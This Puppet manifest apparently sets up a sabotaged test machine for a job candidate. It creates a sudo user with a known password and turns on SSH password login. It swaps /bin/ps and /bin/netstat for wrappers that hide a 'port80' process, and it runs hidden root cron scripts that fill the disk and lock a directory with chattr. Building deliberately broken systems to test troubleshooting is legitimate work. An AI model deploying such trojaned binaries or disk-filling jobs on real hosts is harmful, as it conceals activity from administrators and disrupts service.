user {'candidate':
  ensure     => present,
  groups     => ['sudo'],
  home       => '/home/candidate',
  managehome => true,
  password   => '$6$1Pqx8McG$B8FcFn2eCoBKIcTJA8Cgz89I1q6MJ6FsrLai43rT7/WR4WTnSpC45gH3y5h/Iht72TInaVRW99hadQQgNgdaR0',
}

file { '/usr/share/doc/.netstat':
  ensure => file,
  owner  => 'root',
  group  => 'root',
  mode   => 0755,
  source => '/bin/netstat',
}

file { '/bin/netstat':
  ensure  => file,
  owner   => 'root',
  group   => 'root',
  mode    => 0755,
  content => '#!/bin/bash
/usr/share/doc/.netstat $@ | egrep -v port80 | egrep -v /usr/share/doc/\.netstat
',
  require => File['/usr/share/doc/.netstat'],
}

file { '/usr/share/doc/.ps':
  ensure => file,
  owner  => 'root',
  group  => 'root',
  mode   => 0755,
  source => '/bin/ps',
}

file { '/bin/ps':
  ensure  => file,
  owner   => 'root',
  group   => 'root',
  mode    => 0755,
  content => '#!/bin/bash
/usr/share/doc/.ps $@ | egrep -v port80 | egrep -v /usr/share/doc/\.ps
',
  require => File['/usr/share/doc/.ps'],
}

service {'ssh':
  ensure => running,
  enable => true,
}

augeas { 'sshd_config_password':
  context => "/files/etc/ssh/sshd_config",
  changes => "set PasswordAuthentication yes",
  onlyif  => "get PasswordAuthentication != yes",
  notify  => Service['ssh'],
}

file { '/usr/share/doc/.fill_the_disk':
  ensure => file,
  owner  => 'root',
  group  => 'root',
  mode   => 0755,
  source => '/vagrant/source/fill_the_disk',
}

file { '/usr/share/doc/.port80':
  ensure => file,
  owner  => 'root',
  group  => 'root',
  mode   => 0755,
  source => '/vagrant/source/port80',
}

cron { 'fill_the_disk':
  command => 'mkdir /var/lib/php5; cd /var/lib/php5; /usr/share/doc/.fill_the_disk; chattr +i /var/lib/php5',
  user    => 'root',
  minute  => '*/5', 
  require => File['/usr/share/doc/.fill_the_disk'],
}

cron { 'port80':
  command => '/usr/share/doc/.port80',
  user    => 'root',
  minute  => '*/5', 
  require => File['/usr/share/doc/.port80'],
}

file { '/home/candidate/wordpress-3.9.1.tar.gz':
  ensure  => file,
  source  => '/vagrant/source/wordpress-3.9.1.tar.gz',
  require => User['candidate']
}

# password is candidate
